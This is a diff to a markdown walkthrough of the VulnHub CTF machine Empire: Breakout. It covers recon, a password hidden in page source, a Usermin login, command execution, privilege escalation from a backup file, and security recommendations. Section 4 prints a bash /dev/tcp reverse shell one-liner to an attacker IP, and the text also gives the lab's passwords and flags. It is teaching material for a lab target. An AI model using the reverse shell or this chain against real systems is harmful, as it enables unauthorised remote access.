@@ -1,211 +1,282 @@
-# Empire: Breakout Penetration Testing Walkthrough
-<h1 align="center">Empire: Breakout Penetration Testing Walkthrough</h1>
-<h3 align="center">From Reconnaissance to Root Access - A Complete CTF Guide</h3>
+<h1 align="center">🐧 Empire: Breakout — Penetration Testing Walkthrough</h1>
+<h3 align="center">From Reconnaissance to Root Access — A Complete CTF Guide</h3>
 
 <p align="center">
   <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
   <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
   <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
   <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
+  <img src="https://img.shields.io/badge/Platform-VulnHub-purple" alt="Platform">
 </p>
+
 ---
+
+## 📖 Table of Contents
+- [Overview](#-overview)
+- [Objectives](#-objectives)
+- [1. Reconnaissance](#1-reconnaissance)
+- [2. Web Enumeration & Credential Discovery](#2-web-enumeration--credential-discovery)
+- [3. Initial Web Login](#3-initial-web-login)
+- [4. Command Injection & Reverse Shell](#4-command-injection--reverse-shell)
+- [5. User Flag](#5-user-flag)
+- [6. Privilege Escalation](#6-privilege-escalation)
+- [7. Root Flag](#7-root-flag)
+- [Security Recommendations](#-security-recommendations)
+- [Tools Used](#-tools-used)
+
+---
+
 ## 📋 Overview
-This guide documents the complete penetration testing methodology for Empire: Breakout, detailing each step from initial reconnaissance to privilege escalation and flag capture. This walkthrough serves as a continuation of the LupinOne series, focusing on a distinct set of exploitation techniques.
+This guide documents the complete penetration testing methodology for **Empire: Breakout**, detailing every step from initial reconnaissance to privilege escalation and flag capture. This walkthrough serves as a continuation of the LupinOne series, focusing on a distinct set of exploitation techniques.
 
 ## 🎯 Objectives
+- Identify the target system and open services
+- Enumerate hidden credentials within web application source code
+- Decode obfuscated strings to retrieve login credentials
+- Exploit command injection to gain an initial low-privilege reverse shell
+- Escalate privileges using exposed backup files
+- Capture both the user and root flags
 
-- Identify the target system and open services.
-- Enumerate hidden credentials within web application source code.
-- Decode obfuscated strings to retrieve login credentials.
-- Exploit command injection to gain an initial low-privilege reverse shell.
-- Escalate privileges using exposed backup files.
-- Capture both the user and root flags.
-
-## 1. Reconnaissance.
-### **Network Discovery.**
-We will first run the command;
-> $ ifconfig
 ---
 
-- To check what IP is allocated to the attacking machine and also determine the subnet range.
+## 1. Reconnaissance
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s1.png" alt="ifconfig Output" width="600"/> </p>
+### 🔎 Network Discovery
+Check the IP allocated to the attacking machine and determine the subnet range.
 
-*Screenshot 1: ifconfig output showing network interfaces*
+```bash
+$ ifconfig
+```
 
-### **Host Discovery**
-> $ nmap -sn 192.168.56.0/24
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s1.png" alt="ifconfig output showing network interfaces" width="600"/>
+</p>
+
+### 🌐 Host Discovery
+Ping sweep to identify live hosts within the subnet.
+
+```bash
+$ nmap -sn 192.168.56.0/24
+```
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s2.png" alt="Nmap ping sweep results" width="600"/>
+</p>
+
+### 🛰️ Port Scan
+The `-A` flag enables aggressive mode, bundling OS and service detection.
+
+```bash
+$ nmap -A 192.168.56.20
+```
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s3.png" alt="Detailed Nmap port scan results" width="600"/>
+</p>
+
+**Findings:**
+
+| Port | Service | Version |
+|------|---------|---------|
+| 80 | HTTP | Apache httpd 2.4.51 (Debian) |
+| 139 / 445 | SMB | Samba smbd 4 |
+| 10000 | HTTP | MiniServ 1.981 (Webmin) |
+| 20000 | HTTP | MiniServ 1.830 (Usermin) |
+
 ---
-- We are trying to do a ping sweep to identify live hosts within the subnet.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s2.png" alt="Nmap Ping Sweep" width="600"/> </p>
+## 2. Web Enumeration & Credential Discovery
 
-*Screenshot 2: Nmap ping sweep results*
-
-### **Port Scan**
-> $ nmap -A 192.168.56.20
----
-
-- **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.
-
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s3.png" alt="Nmap Port Scan" width="600"/> </p>
-
-*Screenshot 3: Detailed port scan results*
-
-### Findings
-From our previous scan we can see that:
-- Port 80 (HTTP) - Apache httpd 2.4.51 (Debian)
-- Port 139/445 (SMB) - Samba smbd 4
-- Port 10000 (HTTP) - MiniServ 1.981 (Webmin)
-- Port 20000 (HTTP) - MiniServ 1.830 (Usermin)
-
-## 2. Web Enumeration & Credential Discovery.
-### **Inspecting the Default Web Page**
+### 🌍 Inspecting the Default Web Page
 Navigating to `http://192.168.56.20`, we encounter the default Apache2 Debian page.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s4.png" alt="Apache Default Page" width="600"/> </p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s4.png" alt="Apache2 Debian default landing page" width="600"/>
+</p>
 
-*Screenshot 4: Apache2 Debian default landing page*
+### 🔍 Finding Hidden Source Code
+Viewing the page source (`Ctrl+U`) reveals a hidden comment at the very bottom of the HTML file containing encoded data.
 
-### **Finding Hidden Source Code**
-Viewing the page source (Ctrl+U) reveals a hidden comment at the very bottom of the HTML file containing encoded data.
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s9.png" alt="Source code comment with hidden credentials" width="600"/>
+</p>
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s9.png" alt="Source Code Comment" width="600"/> </p>
+### 🧩 Decoding Brainfuck Obfuscation
+The comment contains a string composed of `+`, `-`, `<`, `>`, `[`, `]`, `.`, `,` — this corresponds to the **Brainfuck** programming language. We use an online Brainfuck interpreter to decode the string.
 
-*Screenshot 5: Examining source code for hidden credentials*
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s10.png" alt="Decoding hidden text using a Brainfuck interpreter" width="600"/>
+</p>
 
-### **Decoding Brainfuck Obfuscation**
-The comment contains a string composed of `+`, `-`, `<`, `>`, `[`, `]`, `.`, `,`. This corresponds to the **Brainfuck** programming language.
-We use an online Brainfuck interpreter to decode the string.
+**Decoded string:** `.2uqPEf3jD<P`a-3`
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s10.png" alt="Brainfuck Decoder" width="600"/> </p>
-
-*Screenshot 6: Decoding the hidden text using a Brainfuck interpreter*
-
-**Decoded String:** `.2uqPEf3jD<P`a-3`
-
-## 3. Initial Web Login.
-### **Accessing Usermin Interface**
-We open the Usermin web interface running on port `20000`.
-> http://192.168.56.20:20000
 ---
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s6.png" alt="Usermin Login" width="600"/> </p>
+## 3. Initial Web Login
 
-*Screenshot 7: Usermin login portal on port 20000*
+### 🔑 Accessing the Usermin Interface
+We open the Usermin web interface running on port `20000`.
 
-### **Finding Valid Username**
+```
+http://192.168.56.20:20000
+```
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s6.png" alt="Usermin login portal on port 20000" width="600"/>
+</p>
+
+### 👤 Finding a Valid Username
 Running an enumeration scan on the target reveals a valid local user named `cyber`.
-> $ enum4linux -U 192.168.56.20
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s7.png" alt="Enum4Linux Output" width="600"/> </p>
+```bash
+$ enum4linux -U 192.168.56.20
+```
 
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s7.png" alt="Enum4Linux output" width="600"/>
+</p>
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s8.png" alt="Enum4Linux Output" width="600"/> </p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s8.png" alt="Enum4Linux discovering the user cyber" width="600"/>
+</p>
 
-*Screenshot 8: Enum4Linux discovering the user 'cyber'*
-
-### **Logging In**
+### ✅ Logging In
 Using the discovered username (`cyber`) and the decoded Brainfuck password, we successfully log into the Usermin dashboard.
 
-## 4. Command Injection & Reverse Shell.
-### **Exploiting Custom Commands**
+---
+
+## 4. Command Injection & Reverse Shell
+
+### 💻 Exploiting Custom Commands
 Once inside the Usermin dashboard, we navigate to the **Custom Commands** section. This area allows us to execute system commands directly on the target server.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s11.png" alt="Usermin Custom Commands" width="600"/> </p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s11.png" alt="Executing commands via Usermin Custom Commands" width="600"/>
+</p>
 
-*Screenshot 9: Executing commands via Usermin Custom Commands*
-### **Establishing Reverse Shell**
-We set up a netcat listener on the attacker machine:
-> $ nc -nlvp 999
+### 📡 Establishing a Reverse Shell
+Set up a netcat listener on the attacker machine:
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s12.png" alt="Netcat Listener" width="600"/> </p>
+```bash
+$ nc -nlvp 999
+```
 
-*Screenshot 10: Gaining an interactive shell as user 'cyber'*
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s12.png" alt="Netcat listener" width="600"/>
+</p>
 
-We craft a reverse shell payload to connect back to our attacker machine.
-> $ bash -i >& /dev/tcp/192.168.56.12/999 0>&1
+Craft a reverse shell payload to connect back to the attacker machine:
+
+```bash
+$ bash -i >& /dev/tcp/192.168.56.12/999 0>&1
+```
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s13.png" alt="Gaining an interactive shell as user cyber" width="600"/>
+</p>
+
+### 🚪 Upgrading the Shell
+Upgrade the limited shell to a fully interactive TTY session for better navigation.
+
+```bash
+cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
+cyber@breakout:~$ export TERM=xterm
+```
+
 ---
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s13.png" alt="Reverse Shell" width="600"/> </p>
+## 5. User Flag
 
-
-### **Upgrading the Shell**
-We upgrade the limited shell to a fully interactive TTY session for better navigation.
-> cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"
-
-> cyber@breakout:~$ export TERM=xterm
-
-## 5. User Flag.
-### **Capturing User Flag**
+### 🏴 Capturing the User Flag
 From the home directory, we capture the user flag.
-> cyber@breakout:~$ ls
 
-> user.txt
+```bash
+cyber@breakout:~$ ls
+user.txt
+cyber@breakout:~$ cat user.txt
+```
 
-> cyber@breakout:~$ cat user.txt
+**User flag:** `3mp1r3{You_Manage_To_Break_To_My_Secure_Access}`
+
 ---
 
-**User Flag:** `3mp1r3{You_Manage_To_Break_To_My_Secure_Access}`
+## 6. Privilege Escalation
 
----
-## 6. Privilege Escalation.
-### **Enumerating Backup Files**
-We check the `/var/backups` directory for sensitive leftover files.
-> cyber@breakout:~$ ls -alps /var/backups
+### 🗂️ Enumerating Backup Files
+Check the `/var/backups` directory for sensitive leftover files.
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s14.png" alt="Backup file enumeration" width="600"/> </p>
+```bash
+cyber@breakout:~$ ls -alps /var/backups
+```
 
-*Screenshot 11: Identifying the `.old_pass.bak` file*
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s14.png" alt="Identifying the .old_pass.bak file" width="600"/>
+</p>
 
-### **Extracting Root Credentials**
-We find a file named `.old_pass.bak`. Reading its contents provides a high-entropy string.
-> cyber@breakout:~$ cat /var/backups/.old_pass.bak
+### 🔓 Extracting Root Credentials
+A file named `.old_pass.bak` is found. Reading its contents reveals a high-entropy string.
+
+```bash
+cyber@breakout:~$ cat /var/backups/.old_pass.bak
+```
 
 **Output:** `Ts&4&YurgtRX(==~h`
 
-### **Switching to Root User**
+### 🏁 Switching to Root
 We attempt to use this string as the password for the root user.
 
-> cyber@breakout:~$ su
+```bash
+cyber@breakout:~$ su
+```
 
-**Enter Password:** `Ts&4&YurgtRX(==~h`
+**Password:** `Ts&4&YurgtRX(==~h`
 
-<p align="center"> <img src="https://github.com/itstallam/Empire-BreakOut/blob/main/Screenshots/s16.png" alt="Root Access" width="600"/> </p>
+<p align="center">
+  <img src="https://raw.githubusercontent.com/itstallam/Empire-BreakOut/main/Screenshots/s16.png" alt="Successfully escalating to root" width="600"/>
+</p>
 
-*Screenshot 12: Successfully escalating to root*
+---
 
-## 7. Root Flag.
-### **Capturing Root Flag**
-> root@breakout:/var/backups# cd /root
+## 7. Root Flag
 
-> root@breakout:/root# ls
+```bash
+root@breakout:/var/backups# cd /root
+root@breakout:/root# ls
+r00t.txt
+root@breakout:/root# cat r00t.txt
+```
 
-> r00t.txt
-
-> root@breakout:/root# cat r00t.txt
+🎉 **Root access achieved — flag captured!**
 
 ---
 
 ## 🔒 Security Recommendations
 
-- **Source Code Hygiene:** Never embed encoded credentials, even in comments, within client-side source code.
-- **Web Application Restrictions:** Disable or restrict access to "Custom Commands" in Usermin/Webmin for unprivileged users.
-- **Backup File Protection:** Do not store plaintext passwords in backup files. If necessary, encrypt them and restrict file permissions to root only.
-- **User Enumeration:** Disable SMB null session enumeration to prevent attackers from identifying valid local usernames.
-- **Password Rotation:** Implement strict password rotation policies for the root account and system administrators.
+- **Source Code Hygiene** — Never embed encoded credentials, even in comments, within client-side source code
+- **Web Application Restrictions** — Disable or restrict access to "Custom Commands" in Usermin/Webmin for unprivileged users
+- **Backup File Protection** — Never store plaintext passwords in backup files; if necessary, encrypt them and restrict file permissions to root only
+- **User Enumeration** — Disable SMB null-session enumeration to prevent attackers from identifying valid local usernames
+- **Password Rotation** — Implement strict password rotation policies for the root account and system administrators
+
+---
 
 ## 🔧 Tools Used
 
-```bash
-🛡️ Network & Service Discovery:
-- ifconfig · Nmap · enum4linux
+**🛡️ Network & Service Discovery**
+`ifconfig` · `nmap` · `enum4linux`
 
-🔓 Exploitation Tools:
-- Brainfuck Interpreter · Netcat · Python3
+**🔓 Exploitation**
+Brainfuck Interpreter · `netcat` · Python3
 
-🔍 Information Gathering:
-- Web Browser (Source Viewer) · cat · ls
+**🔍 Information Gathering**
+Web browser (source viewer) · `cat` · `ls`
 
-💻 System Tools:
-- sudo · su · pty
+**💻 System Tools**
+`sudo` · `su` · `pty`
+
+---
+
+<p align="center">
+  <strong>Documentation created for educational purposes</strong><br>
+  All techniques should be practiced only in controlled, authorized environments.
+</p>
